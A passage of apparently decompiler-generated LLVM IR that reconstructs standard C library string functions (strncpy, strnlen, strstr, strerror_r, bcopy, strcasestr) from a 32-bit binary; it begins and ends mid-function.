dec_label_pc_80533b1.dec_label_pc_80533b1_crit_edge: ; preds = %dec_label_pc_80533b1
  %v0_80533b1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80533b1

dec_label_pc_80533b7:                             ; preds = %dec_label_pc_80533b1
  store i32 %v4_80533ad, i32* %eax.global-to-local, align 4
  %v2_80533bb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80533bb, i32* @edx, align 4
  %v2_80533bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80533bc, i32* @esi, align 4
  ret i32 %v4_80533ad

; uselistorder directives
  uselistorder i32 %v0_80533b3, { 1, 0 }
  uselistorder i32 %v7_80533b2, { 1, 0 }
  uselistorder i1 %v5_80533b2, { 1, 0 }
  uselistorder i32 %v4_80533ad, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80533d5 = load i32, i32* @esi, align 4
  store i32 %v0_80533d5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80533e1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80533e1, i32* %edi.global-to-local, align 4
  %v1_80533e5 = add i32 %arg3, 1
  store i32 %v1_80533e5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80533e6

dec_label_pc_80533e6:                             ; preds = %dec_label_pc_80533e9, %entry
  %v3_80533ea = phi i32 [ %v4_80533e1, %entry ], [ %v8_80533ea, %dec_label_pc_80533e9 ]
  %v0_80533e6 = phi i32 [ %v1_80533e5, %entry ], [ %v0_80533e6.pre, %dec_label_pc_80533e9 ]
  %v1_80533e6 = add i32 %v0_80533e6, -1
  %v8_80533e6 = icmp eq i32 %v1_80533e6, 0
  store i32 %v1_80533e6, i32* %ecx.global-to-local, align 4
  br i1 %v8_80533e6, label %.loopexit, label %dec_label_pc_80533e9

dec_label_pc_80533e9:                             ; preds = %dec_label_pc_80533e6
  %v0_80533e9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80533e9 = inttoptr i32 %v0_80533e9 to i8*
  %v2_80533e9 = load i8, i8* %v1_80533e9, align 1
  %v10_80533e9 = load i1, i1* @df, align 1
  %v11_80533e9 = select i1 %v10_80533e9, i32 -1, i32 1
  %v12_80533e9 = add i32 %v11_80533e9, %v0_80533e9
  store i32 %v12_80533e9, i32* %esi.global-to-local, align 4
  %v4_80533ea = inttoptr i32 %v3_80533ea to i8*
  store i8 %v2_80533e9, i8* %v4_80533ea, align 1
  %v5_80533ea = load i32, i32* %edi.global-to-local, align 4
  %v6_80533ea = load i1, i1* @df, align 1
  %v7_80533ea = select i1 %v6_80533ea, i32 -1, i32 1
  %v8_80533ea = add i32 %v7_80533ea, %v5_80533ea
  store i32 %v8_80533ea, i32* %edi.global-to-local, align 4
  %v6_80533eb = icmp eq i8 %v2_80533e9, 0
  %v1_80533ed = icmp eq i1 %v6_80533eb, false
  %v0_80533e6.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_80533ed, label %dec_label_pc_80533e6, label %dec_label_pc_80533ef

dec_label_pc_80533ef:                             ; preds = %dec_label_pc_80533e9
  %v1_80533ef = add i32 %v0_80533e6.pre, -1
  store i32 %v1_80533ef, i32* %ecx.global-to-local, align 4
  %v2_80533f0 = sext i8 %v2_80533e9 to i32
  %v4_80533f0 = inttoptr i32 %v8_80533ea to i8*
  %v5_80533f0 = call i8* @_memset(i8* %v4_80533f0, i32 %v2_80533f0, i32 %v1_80533ef)
  %v6_80533f0 = ptrtoint i8* %v5_80533f0 to i32
  store i32 %v6_80533f0, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_80533e6, %dec_label_pc_80533ef
  %v2_80533f6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80533f6, i32* @edx, align 4
  %v2_80533f7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80533f7, i32* @esi, align 4
  ret i32 %v4_80533e1

; uselistorder directives
  uselistorder i32 %v8_80533ea, { 0, 2, 1 }
  uselistorder i8 %v2_80533e9, { 0, 2, 1 }
  uselistorder i32 %v1_80533e6, { 1, 0 }
  uselistorder i32 %v4_80533e1, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_80533fc = ptrtoint i8* %tmp4 to i32
  %v8_805340f8 = icmp eq i32 %tmp, 0
  %v1_805341010 = icmp eq i1 %v8_805340f8, false
  br i1 %v1_805341010, label %dec_label_pc_8053409, label %dec_label_pc_8053412

dec_label_pc_8053409:                             ; preds = %entry, %dec_label_pc_805340e
  %v1_805340f12 = phi i32 [ %v1_805340f, %dec_label_pc_805340e ], [ %tmp, %entry ]
  %v0_805341211 = phi i32 [ %v1_805340e, %dec_label_pc_805340e ], [ %v4_80533fc, %entry ]
  %v1_8053409 = inttoptr i32 %v0_805341211 to i8*
  %v2_8053409 = load i8, i8* %v1_8053409, align 1
  %v3_8053409 = icmp eq i8 %v2_8053409, 0
  br i1 %v3_8053409, label %dec_label_pc_8053412, label %dec_label_pc_805340e

dec_label_pc_805340e:                             ; preds = %dec_label_pc_8053409
  %v1_805340e = add i32 %v0_805341211, 1
  %v1_805340f = add i32 %v1_805340f12, -1
  %v8_805340f = icmp eq i32 %v1_805340f, 0
  %v1_8053410 = icmp eq i1 %v8_805340f, false
  br i1 %v1_8053410, label %dec_label_pc_8053409, label %dec_label_pc_8053412

dec_label_pc_8053412:                             ; preds = %dec_label_pc_805340e, %dec_label_pc_8053409, %entry
  %v0_8053412.lcssa = phi i32 [ %v4_80533fc, %entry ], [ %v0_805341211, %dec_label_pc_8053409 ], [ %v1_805340e, %dec_label_pc_805340e ]
  %v2_8053412 = sub i32 %v0_8053412.lcssa, %v4_80533fc
  ret i32 %v2_8053412

; uselistorder directives
  uselistorder i32 %v1_805340f, { 1, 0 }
  uselistorder i32 %v0_805341211, { 0, 2, 1 }
  uselistorder i32 %v4_80533fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053409, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_805341b = load i32, i32* @ebx, align 4
  %v4_805341f = ptrtoint i8* %arg2 to i32
  %v2_8053427 = load i8, i8* %arg2, align 1
  %v1_805342a = icmp eq i8 %v2_8053427, 0
  br i1 %v1_805342a, label %dec_label_pc_80534de, label %dec_label_pc_8053435

dec_label_pc_8053435:                             ; preds = %entry
  %v1_8053435 = add i32 %arg1, -1
  br label %dec_label_pc_8053436

dec_label_pc_8053436:                             ; preds = %dec_label_pc_8053442, %dec_label_pc_8053435
  %v0_8053436 = phi i32 [ %v1_8053436, %dec_label_pc_8053442 ], [ %v1_8053435, %dec_label_pc_8053435 ]
  %v1_8053436 = add i32 %v0_8053436, 1
  %v1_8053437 = inttoptr i32 %v1_8053436 to i8*
  %v2_8053437 = load i8, i8* %v1_8053437, align 1
  %v1_805343a = icmp eq i8 %v2_8053437, 0
  br i1 %v1_805343a, label %dec_label_pc_80534dc, label %dec_label_pc_8053442

dec_label_pc_8053442:                             ; preds = %dec_label_pc_8053436
  %v14_8053442 = icmp eq i8 %v2_8053437, %v2_8053427
  %v1_8053445 = icmp eq i1 %v14_8053442, false
  br i1 %v1_8053445, label %dec_label_pc_8053436, label %dec_label_pc_8053447

dec_label_pc_8053447:                             ; preds = %dec_label_pc_8053442
  %v1_8053447 = add i32 %v4_805341f, 1
  %v2_805344e = inttoptr i32 %v1_8053447 to i8*
  %v3_805344e = load i8, i8* %v2_805344e, align 1
  %v1_8053452 = icmp eq i8 %v3_805344e, 0
  br i1 %v1_8053452, label %dec_label_pc_80534de, label %dec_label_pc_805345a

dec_label_pc_805345a:                             ; preds = %dec_label_pc_8053447
  %v1_805345a = add i32 %v0_8053436, 2
  %v1_80534a4 = add i32 %v4_805341f, 2
  %v2_80534a4 = inttoptr i32 %v1_80534a4 to i8*
  br label %dec_label_pc_8053490

dec_label_pc_8053465:                             ; preds = %dec_label_pc_80534d4
  %v2_8053465 = inttoptr i32 %v0_8053496 to i8*
  %v3_8053465 = load i8, i8* %v2_8053465, align 1
  br label %dec_label_pc_8053483.preheader

dec_label_pc_8053483.preheader:                   ; preds = %dec_label_pc_8053465, %dec_label_pc_8053490
  %v0_805346e.ph.in = phi i8 [ %v4_805345a.sink.in, %dec_label_pc_8053490 ], [ %v3_8053465, %dec_label_pc_8053465 ]
  %v14_805348346 = icmp eq i8 %v0_805346e.ph.in, %v2_8053427
  %v1_805348648 = icmp eq i1 %v14_805348346, false
  br i1 %v1_805348648, label %dec_label_pc_805346e, label %dec_label_pc_8053488

dec_label_pc_805346e:                             ; preds = %dec_label_pc_8053483.preheader, %dec_label_pc_805347f
  %v0_805346e50.in = phi i8 [ %v2_8053480, %dec_label_pc_805347f ], [ %v0_805346e.ph.in, %dec_label_pc_8053483.preheader ]
  %v0_805347249 = phi i32 [ %v1_805347f, %dec_label_pc_805347f ], [ %v0_8053496, %dec_label_pc_8053483.preheader ]
  %v1_805346e = icmp eq i8 %v0_805346e50.in, 0
  br i1 %v1_805346e, label %dec_label_pc_80534dc, label %dec_label_pc_8053472

dec_label_pc_8053472:                             ; preds = %dec_label_pc_805346e
  %v1_8053472 = add i32 %v0_805347249, 1
  %v1_8053473 = inttoptr i32 %v1_8053472 to i8*
  %v2_8053473 = load i8, i8* %v1_8053473, align 1
  %v14_8053476 = icmp eq i8 %v2_8053473, %v2_8053427
  br i1 %v14_8053476, label %dec_label_pc_8053488, label %dec_label_pc_805347b

dec_label_pc_805347b:                             ; preds = %dec_label_pc_8053472
  %v1_805347b = icmp eq i8 %v2_8053473, 0
  br i1 %v1_805347b, label %dec_label_pc_80534dc, label %dec_label_pc_805347f

dec_label_pc_805347f:                             ; preds = %dec_label_pc_805347b
  %v1_805347f = add i32 %v0_805347249, 2
  %v1_8053480 = inttoptr i32 %v1_805347f to i8*
  %v2_8053480 = load i8, i8* %v1_8053480, align 1
  %v14_8053483 = icmp eq i8 %v2_8053480, %v2_8053427
  %v1_8053486 = icmp eq i1 %v14_8053483, false
  br i1 %v1_8053486, label %dec_label_pc_805346e, label %dec_label_pc_8053488

dec_label_pc_8053488:                             ; preds = %dec_label_pc_805347f, %dec_label_pc_8053472, %dec_label_pc_8053483.preheader
  %v0_8053488 = phi i32 [ %v0_8053496, %dec_label_pc_8053483.preheader ], [ %v1_8053472, %dec_label_pc_8053472 ], [ %v1_805347f, %dec_label_pc_805347f ]
  %v1_8053488 = add i32 %v0_8053488, 1
  br label %dec_label_pc_8053490

dec_label_pc_8053490:                             ; preds = %dec_label_pc_805345a, %dec_label_pc_8053488
  %v0_8053496 = phi i32 [ %v1_805345a, %dec_label_pc_805345a ], [ %v1_8053488, %dec_label_pc_8053488 ]
  %v4_805345a.sink.in.in.in = phi i32 [ %v1_805345a, %dec_label_pc_805345a ], [ %v1_8053488, %dec_label_pc_8053488 ]
  %v4_805345a.sink.in.in = inttoptr i32 %v4_805345a.sink.in.in.in to i8*
  %v4_805345a.sink.in = load i8, i8* %v4_805345a.sink.in.in, align 1
  %storemerge5 = icmp eq i8 %v4_805345a.sink.in, %v3_805344e
  %v1_8053490 = icmp eq i1 %storemerge5, false
  br i1 %v1_8053490, label %dec_label_pc_8053483.preheader, label %dec_label_pc_8053492

dec_label_pc_8053492:                             ; preds = %dec_label_pc_8053490
  %v1_8053496 = add i32 %v0_8053496, 1
  %v1_805349d = add i32 %v0_8053496, -1
  %v2_80534a0 = inttoptr i32 %v1_8053496 to i8*
  %v3_80534a0 = load i8, i8* %v2_80534a0, align 1
  %v4_80534a0 = zext i8 %v3_80534a0 to i32
  %v3_80534a4 = load i8, i8* %v2_80534a4, align 1
  %v4_80534a4 = zext i8 %v3_80534a4 to i32
  %v12_80534a9 = icmp eq i8 %v3_80534a0, %v3_80534a4
  %v1_80534ab = icmp eq i1 %v12_80534a9, false
  br i1 %v1_80534ab, label %dec_label_pc_80534d4, label %dec_label_pc_80534ad

dec_label_pc_80534ad:                             ; preds = %dec_label_pc_8053492, %dec_label_pc_80534c1
  %v0_80534c4 = phi i32 [ %v1_80534c4, %dec_label_pc_80534c1 ], [ %v1_80534a4, %dec_label_pc_8053492 ]
  %v0_80534c1 = phi i32 [ %v1_80534c1, %dec_label_pc_80534c1 ], [ %v1_8053496, %dec_label_pc_8053492 ]
  %v0_80534ad = phi i32 [ %v3_80534c7, %dec_label_pc_80534c1 ], [ %v4_80534a0, %dec_label_pc_8053492 ]
  %v1_80534ad = icmp eq i32 %v0_80534ad, 0
  br i1 %v1_80534ad, label %dec_label_pc_80534de, label %dec_label_pc_80534b1

dec_label_pc_80534b1:                             ; preds = %dec_label_pc_80534ad
  %v1_80534b1 = add i32 %v0_80534c1, 1
  %v2_80534b1 = inttoptr i32 %v1_80534b1 to i8*
  %v3_80534b1 = load i8, i8* %v2_80534b1, align 1
  %v1_80534b5 = add i32 %v0_80534c4, 1
  %v2_80534b5 = inttoptr i32 %v1_80534b5 to i8*
  %v3_80534b5 = load i8, i8* %v2_80534b5, align 1
  %v4_80534b5 = zext i8 %v3_80534b5 to i32
  %v12_80534b9 = icmp eq i8 %v3_80534b1, %v3_80534b5
  %v1_80534bb = icmp eq i1 %v12_80534b9, false
  br i1 %v1_80534bb, label %dec_label_pc_80534d4, label %dec_label_pc_80534bd

dec_label_pc_80534bd:                             ; preds = %dec_label_pc_80534b1
  %v1_80534bd = icmp eq i8 %v3_80534b5, 0
  br i1 %v1_80534bd, label %dec_label_pc_80534de, label %dec_label_pc_80534c1

dec_label_pc_80534c1:                             ; preds = %dec_label_pc_80534bd
  %v1_80534c1 = add i32 %v0_80534c1, 2
  %v1_80534c4 = add i32 %v0_80534c4, 2
  %v1_80534c7 = inttoptr i32 %v1_80534c4 to i8*
  %v2_80534c7 = load i8, i8* %v1_80534c7, align 1
  %v3_80534c7 = zext i8 %v2_80534c7 to i32
  %v1_80534cb = inttoptr i32 %v1_80534c1 to i8*
  %v2_80534cb = load i8, i8* %v1_80534cb, align 1
  %v12_80534ce = icmp eq i8 %v2_80534cb, %v2_80534c7
  br i1 %v12_80534ce, label %dec_label_pc_80534ad, label %dec_label_pc_80534d2

dec_label_pc_80534d2:                             ; preds = %dec_label_pc_80534c1
  br label %dec_label_pc_80534d4

dec_label_pc_80534d4:                             ; preds = %dec_label_pc_80534b1, %dec_label_pc_8053492, %dec_label_pc_80534d2
  %v0_80534d4 = phi i32 [ %v4_80534a4, %dec_label_pc_8053492 ], [ %v3_80534c7, %dec_label_pc_80534d2 ], [ %v4_80534b5, %dec_label_pc_80534b1 ]
  %v1_80534d4 = icmp eq i32 %v0_80534d4, 0
  %v1_80534d6 = icmp eq i1 %v1_80534d4, false
  br i1 %v1_80534d6, label %dec_label_pc_8053465, label %dec_label_pc_80534de

dec_label_pc_80534dc:                             ; preds = %dec_label_pc_8053436, %dec_label_pc_805347b, %dec_label_pc_805346e
  br label %dec_label_pc_80534de

dec_label_pc_80534de:                             ; preds = %dec_label_pc_80534d4, %dec_label_pc_80534ad, %dec_label_pc_80534bd, %entry, %dec_label_pc_8053447, %dec_label_pc_80534dc
  %storemerge3 = phi i32 [ 0, %dec_label_pc_80534dc ], [ %v1_8053436, %dec_label_pc_8053447 ], [ %arg1, %entry ], [ %v1_805349d, %dec_label_pc_80534bd ], [ %v1_805349d, %dec_label_pc_80534ad ], [ %v1_805349d, %dec_label_pc_80534d4 ]
  store i32 %v0_805341b, i32* @ebx, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_80534c4, { 1, 0 }
  uselistorder i32 %v1_80534c1, { 1, 0 }
  uselistorder i8 %v3_80534b5, { 1, 0, 2 }
  uselistorder i8 %v4_805345a.sink.in, { 1, 0 }
  uselistorder i32 %v0_8053496, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_8053480, { 1, 0 }
  uselistorder i32 %v1_805347f, { 0, 2, 1 }
  uselistorder i8 %v2_8053473, { 1, 0 }
  uselistorder i32 %v0_805347249, { 1, 0 }
  uselistorder i32 %v1_8053436, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80534de, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_80534dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80534d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80534ad, { 1, 0 }
  uselistorder label %dec_label_pc_8053490, { 1, 0 }
  uselistorder label %dec_label_pc_805346e, { 1, 0 }
  uselistorder label %dec_label_pc_8053483.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_80534f9 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8053501 = load i32, i32* @ebx, align 4
  ret i32 %v0_8053501
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_805351a = icmp ugt i32 %arg1, 124
  br i1 %v6_805351a, label %dec_label_pc_8053537, label %dec_label_pc_805351c

dec_label_pc_805351c:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_805dbe0.935 to i32), i32* @esi, align 4
  %v1_805352c4 = icmp eq i32 %arg1, 0
  %v1_805352e11 = icmp eq i1 %v1_805352c4, false
  br i1 %v1_805352e11, label %dec_label_pc_8053525, label %dec_label_pc_8053530

dec_label_pc_8053525:                             ; preds = %dec_label_pc_805351c, %dec_label_pc_8053525
  %v0_8053528 = phi i32 [ %v3_8053528, %dec_label_pc_8053525 ], [ %arg1, %dec_label_pc_805351c ]
  %v0_805352b = phi i32 [ %v1_805352b, %dec_label_pc_8053525 ], [ ptrtoint ([8 x i8]* @global_var_805dbe0.935 to i32), %dec_label_pc_805351c ]
  %v1_8053525 = inttoptr i32 %v0_805352b to i8*
  %v2_8053525 = load i8, i8* %v1_8053525, align 1
  %v7_8053525 = icmp eq i8 %v2_8053525, 0
  %v2_8053528 = zext i1 %v7_8053525 to i32
  %v3_8053528 = add i32 %v2_8053528, %v0_8053528
  %v16_8053528 = icmp eq i32 %v3_8053528, 0
  %v1_805352b = add i32 %v0_805352b, 1
  store i32 %v1_805352b, i32* @esi, align 4
  %v1_805352e = icmp eq i1 %v16_8053528, false
  br i1 %v1_805352e, label %dec_label_pc_8053525, label %dec_label_pc_8053530

dec_label_pc_8053530:                             ; preds = %dec_label_pc_8053525, %dec_label_pc_805351c
  %v0_8053532 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805dbe0.935 to i32), %dec_label_pc_805351c ], [ %v1_805352b, %dec_label_pc_8053525 ]
  store i32 0, i32* @ebp, align 4
  %v1_8053532 = inttoptr i32 %v0_8053532 to i8*
  %v2_8053532 = load i8, i8* %v1_8053532, align 1
  %v3_8053532 = icmp eq i8 %v2_8053532, 0
  %v1_8053535 = icmp eq i1 %v3_8053532, false
  br i1 %v1_8053535, label %dec_label_pc_8053530.dec_label_pc_8053566_crit_edge, label %dec_label_pc_8053537

dec_label_pc_8053530.dec_label_pc_8053566_crit_edge: ; preds = %dec_label_pc_8053530
  br label %dec_label_pc_8053566

dec_label_pc_8053537:                             ; preds = %dec_label_pc_8053530, %entry
  %v1_805353a = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_805354b = bitcast i32* %stack_var_-17 to i8*
  %v7_805354b = call i32 @_uintmaxtostr(i8* %v6_805354b, i32 %arg1, i32 %v1_805353a, i32 -10, i32 0)
  %v1_805355a = add i32 %v7_805354b, -14
  store i32 %v1_805355a, i32* @esi, align 4
  %v5_805355d = inttoptr i32 %v1_805355a to i8*
  store i8* %v5_805355d, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_805355a to i16*
  %v6_805355e = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805dbb6.936 to i32), i32 14)
  %v1_8053570.pre = load i32, i32* @edi, align 4
  %v0_8053576.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053566

dec_label_pc_8053566:                             ; preds = %dec_label_pc_8053530.dec_label_pc_8053566_crit_edge, %dec_label_pc_8053537
  %v0_8053576 = phi i32 [ %v0_8053532, %dec_label_pc_8053530.dec_label_pc_8053566_crit_edge ], [ %v0_8053576.pre, %dec_label_pc_8053537 ]
  %v1_8053570 = phi i32 [ %arg3, %dec_label_pc_8053530.dec_label_pc_8053566_crit_edge ], [ %v1_8053570.pre, %dec_label_pc_8053537 ]
  %v4_8053566 = icmp eq i32 %arg2, 0
  %v3_8053570 = select i1 %v4_8053566, i32 0, i32 %v1_8053570
  store i32 %v3_8053570, i32* @edi, align 4
  %v5_8053576 = inttoptr i32 %v0_8053576 to i8*
  store i8* %v5_8053576, i8** %stack_var_-108, align 4
  %v3_8053577 = call i32 @strlen(i8* %v5_8053576)
  %v1_805357f = add i32 %v3_8053577, 1
  store i32 %v1_805357f, i32* %ebx.global-to-local, align 4
  %v1_8053582 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_805357f, %v1_8053582
  br i1 %tmp, label %dec_label_pc_8053586, label %dec_label_pc_805358d

dec_label_pc_8053586:                             ; preds = %dec_label_pc_8053566
  store i32 %v1_8053582, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_805358d

dec_label_pc_805358d:                             ; preds = %dec_label_pc_8053566, %dec_label_pc_8053586
  %v0_8053592 = phi i32 [ %v1_805357f, %dec_label_pc_8053566 ], [ %v1_8053582, %dec_label_pc_8053586 ]
  %v1_805358d = icmp eq i32 %v0_8053592, 0
  br i1 %v1_805358d, label %dec_label_pc_80535a9, label %dec_label_pc_8053591

dec_label_pc_8053591:                             ; preds = %dec_label_pc_805358d
  %v0_8053593 = load i32, i32* @esi, align 4
  %v8_8053594 = inttoptr i32 %arg2 to i8*
  store i8* %v8_8053594, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8053598 = call i32 @memcpy(i16* %tmp45, i32 %v0_8053593, i32 %v0_8053592)
  %v1_80535a4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80535a4 = add i32 %arg2, -1
  %v3_80535a4 = add i32 %v2_80535a4, %v1_80535a4
  %v4_80535a4 = inttoptr i32 %v3_80535a4 to i8*
  store i8 0, i8* %v4_80535a4, align 1
  br label %dec_label_pc_80535a9

dec_label_pc_80535a9:                             ; preds = %dec_label_pc_805358d, %dec_label_pc_8053591
  %v0_80535a9 = load i32, i32* @ebp, align 4
  %v1_80535a9 = icmp eq i32 %v0_80535a9, 0
  br i1 %v1_80535a9, label %dec_label_pc_80535b4, label %dec_label_pc_80535ad

dec_label_pc_80535ad:                             ; preds = %dec_label_pc_80535a9
  %v0_80535ad = load i8*, i8** %stack_var_-108, align 4
  %v1_80535ad = ptrtoint i8* %v0_80535ad to i32
  %v2_80535ad = call i32 @__errno_location(i32 %v1_80535ad)
  %v0_80535b2 = load i32, i32* @ebp, align 4
  %v2_80535b2 = inttoptr i32 %v2_80535ad to i32*
  store i32 %v0_80535b2, i32* %v2_80535b2, align 4
  %v0_80535b7.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80535b4

dec_label_pc_80535b4:                             ; preds = %dec_label_pc_80535a9, %dec_label_pc_80535ad
  %v0_80535b7 = phi i32 [ 0, %dec_label_pc_80535a9 ], [ %v0_80535b7.pre, %dec_label_pc_80535ad ]
  ret i32 %v0_80535b7

; uselistorder directives
  uselistorder i32 %v1_8053582, { 1, 2, 0 }
  uselistorder i32 %v1_805357f, { 1, 0, 2 }
  uselistorder i32 %v1_805352b, { 0, 2, 1 }
  uselistorder i32 %v3_8053528, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805dbe0.935 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_80535b4, { 1, 0 }
  uselistorder label %dec_label_pc_80535a9, { 1, 0 }
  uselistorder label %dec_label_pc_805358d, { 1, 0 }
  uselistorder label %dec_label_pc_8053566, { 1, 0 }
  uselistorder label %dec_label_pc_8053525, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_80535d0 = inttoptr i32 %arg2 to i8*
  %v3_80535d0 = call i32 @memmove(i8* %v2_80535d0, i32 %arg1)
  ret i32 %v3_80535d0
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80535db = load i32, i32* @ebx, align 4
  %v4_80535df = ptrtoint i8* %arg1 to i32
  %v1_80535eb18 = inttoptr i32 %arg2 to i8*
  %v2_80535eb1932 = load i8, i8* %v1_80535eb18, align 1
  %v4_80535ed2336 = icmp eq i8 %v2_80535eb1932, 0
  %v1_80535ef2538 = icmp eq i1 %v4_80535ed2336, false
  br i1 %v1_80535ef2538, label %dec_label_pc_80535f5.lr.ph.lr.ph, label %dec_label_pc_8053625

dec_label_pc_80535f5.lr.ph.lr.ph:                 ; preds = %entry
  %v3_80535eb2033 = zext i8 %v2_80535eb1932 to i32
  %v4_80535eb.pre.pre = load i32, i32* @eax, align 4
  %v5_80535eb2134 = and i32 %v4_80535eb.pre.pre, -256
  %v6_80535eb2235 = or i32 %v3_80535eb2033, %v5_80535eb2134
  %v4_80535f5.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80535f5.lr.ph

dec_label_pc_80535f5.lr.ph:                       ; preds = %dec_label_pc_80535f5.lr.ph.lr.ph, %dec_label_pc_8053620
  %v4_80535f5.pre = phi i32 [ %v4_80535f5.pre.pre, %dec_label_pc_80535f5.lr.ph.lr.ph ], [ %v0_80535ff, %dec_label_pc_8053620 ]
  %v6_80535eb2241 = phi i32 [ %v6_80535eb2235, %dec_label_pc_80535f5.lr.ph.lr.ph ], [ %v6_80535eb22, %dec_label_pc_8053620 ]
  %v2_80535eb1940 = phi i8 [ %v2_80535eb1932, %dec_label_pc_80535f5.lr.ph.lr.ph ], [ %v2_80535eb19, %dec_label_pc_8053620 ]
  %v0_805362039 = phi i32 [ %v4_80535df, %dec_label_pc_80535f5.lr.ph.lr.ph ], [ %v1_8053620, %dec_label_pc_8053620 ]
  br label %dec_label_pc_80535f5

dec_label_pc_80535f5:                             ; preds = %dec_label_pc_80535f5.lr.ph, %dec_label_pc_8053615
  %v4_80535f5 = phi i32 [ %v4_80535f5.pre, %dec_label_pc_80535f5.lr.ph ], [ %v4_80535f546, %dec_label_pc_8053615 ]
  %v6_80535eb30 = phi i32 [ %v6_80535eb2241, %dec_label_pc_80535f5.lr.ph ], [ %v6_80535eb, %dec_label_pc_8053615 ]
  %v2_80535eb29 = phi i8 [ %v2_80535eb1940, %dec_label_pc_80535f5.lr.ph ], [ %v2_80535eb, %dec_label_pc_8053615 ]
  %v1_80535eb28 = phi i8* [ %v1_80535eb18, %dec_label_pc_80535f5.lr.ph ], [ %v1_80535eb, %dec_label_pc_8053615 ]
  %v0_805361527 = phi i32 [ %arg2, %dec_label_pc_80535f5.lr.ph ], [ %v1_8053615, %dec_label_pc_8053615 ]
  %v0_805361626 = phi i32 [ %v0_805362039, %dec_label_pc_80535f5.lr.ph ], [ %v1_8053616, %dec_label_pc_8053615 ]
  %v1_80535f5 = inttoptr i32 %v0_805361626 to i8*
  %v2_80535f5 = load i8, i8* %v1_80535f5, align 1
  %v3_80535f5 = zext i8 %v2_80535f5 to i32
  %v5_80535f5 = and i32 %v4_80535f5, -256
  %v6_80535f5 = or i32 %v5_80535f5, %v3_80535f5
  %v15_80535f7 = icmp eq i8 %v2_80535eb29, %v2_80535f5
  br i1 %v15_80535f7, label %dec_label_pc_8053615, label %dec_label_pc_80535ff

dec_label_pc_80535ff:                             ; preds = %dec_label_pc_80535f5
  %v0_80535ff = load i32, i32* bitcast (i32** @global_var_805f4a0.938 to i32*), align 32
  %v2_8053605 = load i8, i8* %v1_80535f5, align 1
  %v3_8053605 = zext i8 %v2_8053605 to i32
  %v2_8053608 = load i8, i8* %v1_80535eb28, align 1
  %v3_8053608 = zext i8 %v2_8053608 to i32
  %v2_805360b = mul nuw nsw i32 %v3_8053605, 2
  %v3_805360b = add i32 %v2_805360b, %v0_80535ff
  %v4_805360b = inttoptr i32 %v3_805360b to i16*
  %v5_805360b = load i16, i16* %v4_805360b, align 2
  %v6_805360b = zext i16 %v5_805360b to i32
  %v4_805360f = mul nuw nsw i32 %v3_8053608, 2
  %v5_805360f = add i32 %v4_805360f, %v0_80535ff
  %v6_805360f = inttoptr i32 %v5_805360f to i16*
